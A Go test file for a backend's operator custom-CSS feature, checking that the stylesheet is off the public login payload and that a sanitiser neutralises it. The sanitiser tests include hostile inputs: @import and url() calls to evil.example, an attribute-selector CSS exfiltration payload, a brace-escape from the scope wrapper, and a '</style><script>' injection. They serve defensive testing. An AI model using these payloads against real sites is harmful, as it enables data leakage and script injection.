package handlers_test

/* tema:v1 — the raw-CSS escape hatch and its guards.

⚠⚠ TWO TESTS IN THIS FILE USED TO ASSERT THE OPPOSITE OF WHAT THEY NOW ASSERT.
`TestCustomCSS_ReachesBrandingPayload` pinned the old behaviour — the operator
stylesheet riding the PUBLIC /api/branding payload — and it was a correct test
of an unsafe design: that payload is what the LOGIN PAGE fetches, so the sheet
an operator pasted could restyle the very form they would need to sign in and
turn it off again. The replacement below pins the opposite, and is deliberately
written as "the public payload must NOT carry it" so the old shape cannot come
back without a red test. */

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/stretchr/testify/require"

	"github.com/brf-tech/filex/backend/internal/api/handlers"
	"github.com/brf-tech/filex/backend/internal/db"
	"github.com/brf-tech/filex/backend/internal/tenant"
	"github.com/brf-tech/filex/backend/internal/testutil"
)

const sampleSheet = `.fe { --fe-primary: #ff0000; }`

// enableCustomCSS turns the switch on for a test that is about to read.
func enableCustomCSS(t *testing.T, store db.Store) {
	t.Helper()
	require.NoError(t, store.UpsertSetting(context.Background(), handlers.CustomCSSEnabledSettingKey, "true"))
}

// ─────────────────── where it is (and is not) served ───────────────────

// The public branding payload — the one an ANONYMOUS visitor and the login
// page fetch — must not carry the operator stylesheet at all.
func TestCustomCSS_NeverOnThePublicBrandingPayload(t *testing.T) {
	ctx := context.Background()
	_, store := testutil.NewTestDB(t)
	src := handlers.NewBrandingSource(store, false)
	bh := handlers.NewBranding(src)

	require.NoError(t, store.UpsertSetting(ctx, handlers.CustomCSSSettingKey, sampleSheet))
	enableCustomCSS(t, store)
	src.Invalidate()

	rec := httptest.NewRecorder()
	bh.Get(rec, httptest.NewRequest("GET", "/api/branding", nil))
	require.Equal(t, 200, rec.Code)

	var m map[string]any
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &m))
	_, present := m["custom_css"]
	require.False(t, present,
		"the public branding payload must not carry the operator stylesheet: it is what the login page fetches")
	require.NotContains(t, rec.Body.String(), "--fe-primary",
		"no part of the sheet may appear on a payload an anonymous visitor can read")
}

// The authenticated endpoint serves it — but only when the switch is on.
func TestCustomCSS_OffByDefaultAndServedOnlyWhenEnabled(t *testing.T) {
	ctx := context.Background()
	_, store := testutil.NewTestDB(t)
	h := handlers.NewCustomCSS(store)

	read := func() (string, bool) {
		rec := httptest.NewRecorder()
		h.Get(rec, httptest.NewRequest("GET", "/api/me/custom-css", nil))
		require.Equal(t, 200, rec.Code)
		require.Equal(t, "no-store", rec.Header().Get("Cache-Control"),
			"the off switch must not be defeated by a cached copy of the sheet")
		var body struct {
			CSS     string `json:"css"`
			Enabled bool   `json:"enabled"`
		}
		require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))
		return body.CSS, body.Enabled
	}

	// A sheet is stored, but nobody has turned the feature on.
	require.NoError(t, store.UpsertSetting(ctx, handlers.CustomCSSSettingKey, sampleSheet))
	css, enabled := read()
	require.False(t, enabled)
	require.Equal(t, "", css, "a stored sheet with the switch off must not be served")

	enableCustomCSS(t, store)
	css, enabled = read()
	require.True(t, enabled)
	require.Contains(t, css, "--fe-primary: #ff0000")

	// One click back off.
	require.NoError(t, store.UpsertSetting(ctx, handlers.CustomCSSEnabledSettingKey, "false"))
	css, enabled = read()
	require.False(t, enabled)
	require.Equal(t, "", css)
}

// Everything served is wrapped in the scope rule that carves out the screens
// an operator must always be able to reach.
func TestCustomCSS_ServedInsideTheImmuneScopeWrapper(t *testing.T) {
	ctx := context.Background()
	_, store := testutil.NewTestDB(t)
	h := handlers.NewCustomCSS(store)

	require.NoError(t, store.UpsertSetting(ctx, handlers.CustomCSSSettingKey, sampleSheet))
	enableCustomCSS(t, store)

	rec := httptest.NewRecorder()
	h.Get(rec, httptest.NewRequest("GET", "/api/me/custom-css", nil))
	var body struct {
		CSS string `json:"css"`
	}
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))

	require.Contains(t, body.CSS, "@scope (:root) to (."+handlers.CustomCSSImmuneClass+")",
		"the wrapper is the guard; serving the sheet bare would let it match inside the screen that turns it off")
	require.Less(t, strings.Index(body.CSS, "@scope"), strings.Index(body.CSS, "--fe-primary"),
		"the operator's rules must be INSIDE the wrapper, not beside it")
}

// ─────────────────── the sanitiser ───────────────────

// @import is the other way a stylesheet can originate a request, and it is
// removed outright rather than made inert — there is no harmless @import.
func TestSanitizeCustomCSS_StripsImport(t *testing.T) {
	for _, in := range []string{
		`@import url("https://evil.example/x.css");` + sampleSheet,
		`@import "https://evil.example/x.css";` + sampleSheet,
		`@import url(https://evil.example/x.css) screen;` + sampleSheet,
		`@IMPORT   "https://evil.example/x.css" ;` + sampleSheet,
	} {
		got, err := handlers.SanitizeCustomCSS(in)
		require.NoError(t, err, in)
		require.NotContains(t, strings.ToLower(got.Scoped+got.Hoisted), "@import", in)
		require.NotContains(t, got.Scoped+got.Hoisted, "evil.example", in)
		require.Contains(t, got.Removed, "@import", in)
		require.Contains(t, got.Scoped, "--fe-primary", "the rest of the sheet survives")
	}
}

// A url() that is not a data: URI becomes inert, so the classic CSS
// exfiltration — an attribute selector plus a background image that reports
// what somebody is looking at — cannot originate a request.
func TestSanitizeCustomCSS_MakesRemoteURLsInert(t *testing.T) {
	in := `input[value^="a"] { background: url(https://evil.example/leak?c=a); }
	       .x { cursor: url('//evil.example/c.cur'), auto; }
	       .y { background-image: image-set("https://evil.example/y.png" 1x); }`
	got, err := handlers.SanitizeCustomCSS(in)
	require.NoError(t, err)

	require.NotContains(t, got.Scoped, "evil.example")
	require.Contains(t, got.Scoped, `url("data:,")`)
	require.Contains(t, got.Removed, "image-set()")
	// The selector itself survives — this pass removes the ability to REPORT,
	// not the ability to style.
	require.Contains(t, got.Scoped, `input[value^="a"]`)
}

// data: URIs and same-document #fragments are kept: neither touches the
// network, and both are how an operator legitimately embeds a mark.
func TestSanitizeCustomCSS_KeepsDataURIsAndFragments(t *testing.T) {
	in := `.a { background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'></svg>"); }
	       .b { filter: url(#grayscale); }
	       .c { background: URL( data:image/png;base64,iVBORw0KGgo= ); }`
	got, err := handlers.SanitizeCustomCSS(in)
	require.NoError(t, err)
	require.Empty(t, got.Removed)
	require.Contains(t, got.Scoped, "data:image/svg+xml")
	require.Contains(t, got.Scoped, "url(#grayscale)")
	require.Contains(t, got.Scoped, "data:image/png;base64")
}

// ⚠⚠ The refusal that matters most: an unbalanced brace would close the
// `@scope` wrapper early and leave the rest of the sheet outside the guard,
// free to match inside the screen that turns it off.
func TestSanitizeCustomCSS_RefusesBraceEscapeFromTheWrapper(t *testing.T) {
	_, err := handlers.SanitizeCustomCSS(`.a { color: red; } } .` + handlers.CustomCSSImmuneClass + ` { display: none }`)
	require.Error(t, err)
	require.Contains(t, err.Error(), "closing brace")

	_, err = handlers.SanitizeCustomCSS(`.a { color: red;`)
	require.Error(t, err)
	require.Contains(t, err.Error(), "unclosed")

	// A brace inside a string or a comment is NOT a brace — counting bytes
	// with a regex would refuse both of these, which are ordinary CSS.
	got, err := handlers.SanitizeCustomCSS(`.a::after { content: "}"; } /* } */ .b { color: red; }`)
	require.NoError(t, err)
	require.Contains(t, got.Scoped, ".b")
}

// Nothing inside a comment is scanned — an operator's notes are their own —
// and nothing inside one is fetched or matched either.
func TestSanitizeCustomCSS_DoesNotScanInsideComments(t *testing.T) {
	got, err := handlers.SanitizeCustomCSS(
		`/* şu url(https://ornek.test/a.png) ve @import bir yorum içinde, gövde değil */ .a { color: #000; }`)
	require.NoError(t, err)
	require.Empty(t, got.Removed, "a comment is not a declaration; nothing in it is removed")
	require.Contains(t, got.Scoped, "ornek.test", "the operator's comment is preserved verbatim")
	require.Contains(t, got.Scoped, ".a { color: #000; }")
}

// @font-face and @keyframes are hoisted OUT of the scope wrapper, because both
// define a name rather than matching elements and neither behaves reliably
// inside @scope. Hoisting is only safe because url() has already been guarded.
func TestSanitizeCustomCSS_HoistsNameDefiningAtRules(t *testing.T) {
	in := `@font-face { font-family: Brand; src: url("data:font/woff2;base64,AAA") format("woff2"); }
	       @keyframes pulse { from { opacity: 0 } to { opacity: 1 } }
	       .a { font-family: Brand; }`
	got, err := handlers.SanitizeCustomCSS(in)
	require.NoError(t, err)
	require.Contains(t, got.Hoisted, "@font-face")
	require.Contains(t, got.Hoisted, "@keyframes")
	require.Contains(t, got.Hoisted, "data:font/woff2")
	require.NotContains(t, got.Scoped, "@font-face")
	require.Contains(t, got.Scoped, ".a { font-family: Brand; }")

	rendered := got.Render()
	require.Less(t, strings.Index(rendered, "@font-face"), strings.Index(rendered, "@scope"),
		"a hoisted at-rule must sit OUTSIDE the scope wrapper or it stops working")

	// A hoisted block cannot smuggle a request in either.
	remote, err := handlers.SanitizeCustomCSS(`@font-face { font-family: X; src: url("https://evil.example/f.woff2"); }`)
	require.NoError(t, err)
	require.NotContains(t, remote.Hoisted, "evil.example")
}

// The byte cap and the one refused string.
func TestSanitizeCustomCSS_CapAndStyleClose(t *testing.T) {
	_, err := handlers.SanitizeCustomCSS(strings.Repeat("a", handlers.CustomCSSMaxBytes+1))
	require.Error(t, err)

	_, err = handlers.SanitizeCustomCSS(`body::after { content: '</style><script>alert(1)</script>' }`)
	require.Error(t, err)
	require.Contains(t, err.Error(), "</style")

	// Empty is always fine — it is how the field is cleared.
	got, err := handlers.SanitizeCustomCSS("   ")
	require.NoError(t, err)
	require.True(t, got.Empty())
	require.Equal(t, "", got.Render())
}

// ─────────────────── the write path ───────────────────

// Writing through the settings handler runs the same guard pass, and a refused
// sheet leaves the stored one alone.
func TestCustomCSS_SettingsWriteGuards(t *testing.T) {
	ctx := context.Background()
	_, store := testutil.NewTestDB(t)
	seth := handlers.NewSettings(store)
	seth.AttachBranding(handlers.NewBrandingSource(store, false))
	seth.AttachAppearance(handlers.NewAppearanceSource(store))

	patch := func(ctx context.Context, body string) *httptest.ResponseRecorder {
		req := httptest.NewRequest("PATCH", "/api/admin/settings", strings.NewReader(body)).WithContext(ctx)
		rec := httptest.NewRecorder()
		seth.Update(rec, req)
		return rec
	}
	put := func(ctx context.Context, value string) *httptest.ResponseRecorder {
		body, _ := json.Marshal(map[string]string{"value": value})
		req := httptest.NewRequest("PUT", "/api/admin/settings/"+handlers.CustomCSSSettingKey, strings.NewReader(string(body))).WithContext(ctx)
		rctx := chi.NewRouteContext()
		rctx.URLParams.Add("key", handlers.CustomCSSSettingKey)
		req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
		rec := httptest.NewRecorder()
		seth.Set(rec, req)
		return rec
	}

	body, _ := json.Marshal(map[string]string{handlers.CustomCSSSettingKey: sampleSheet})
	require.Equal(t, 200, patch(ctx, string(body)).Code)

	// Over the cap → 400, and nothing is written.
	tooBig, _ := json.Marshal(map[string]string{handlers.CustomCSSSettingKey: strings.Repeat("a", handlers.CustomCSSMaxBytes+1)})
	require.Equal(t, http.StatusBadRequest, patch(ctx, string(tooBig)).Code)
	v, _ := store.GetSetting(ctx, handlers.CustomCSSSettingKey)
	require.Equal(t, sampleSheet, v, "a refused write leaves the stored sheet alone")

	// A batch containing a refused stylesheet writes NOTHING, not even its
	// other keys — the classification loop runs before the write loop.
	mixed, _ := json.Marshal(map[string]string{
		"site_name":                  "Should Not Land",
		handlers.CustomCSSSettingKey: "body::after { content: '</style><script>alert(1)</script>' }",
	})
	require.Equal(t, http.StatusBadRequest, patch(ctx, string(mixed)).Code)
	v, _ = store.GetSetting(ctx, "site_name")
	require.Equal(t, "", v, "no key of a refused batch may be written")

	// The single-key endpoint enforces the same rules.
	require.Equal(t, http.StatusBadRequest, put(ctx, "a{}</STYLE>").Code)
	require.Equal(t, http.StatusBadRequest, put(ctx, "a{} } .x{}").Code)
	require.Equal(t, 200, put(ctx, ".fe { --fe-bg: #000000; }").Code)

	// An inline SVG data URI keeps its "<" — the refusal is "</style", not "<".
	require.Equal(t, 200, put(ctx, ".fe { background: url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'></svg>\"); }").Code)
}

// ⚠⚠ Instance-wide: a confined tenant admin is refused, so one customer cannot
// restyle — or hide controls on — every other customer's installation. The
// guarantee rests on `ui.*` NOT being in `tenantScopedSettingKey`, which is
// exactly the kind of thing that stays true only while somebody checks.
func TestCustomCSS_TenantAdminRefused(t *testing.T) {
	ctx := context.Background()
	_, store := testutil.NewTestDB(t)
	seth := handlers.NewSettings(store)
	seth.AttachBranding(handlers.NewBrandingSource(store, true))
	seth.AttachAppearance(handlers.NewAppearanceSource(store))

	tctx := tenant.WithScope(ctx, &tenant.Scope{ProviderID: 7, Slug: "acme"})

	for _, key := range []string{handlers.CustomCSSSettingKey, handlers.CustomCSSEnabledSettingKey} {
		body, _ := json.Marshal(map[string]string{key: sampleSheet})
		req := httptest.NewRequest("PATCH", "/api/admin/settings", strings.NewReader(string(body))).WithContext(tctx)
		rec := httptest.NewRecorder()
		seth.Update(rec, req)
		require.Equal(t, http.StatusForbidden, rec.Code, key)

		v, _ := store.GetSetting(ctx, key)
		require.Equal(t, "", v, key)
	}
}
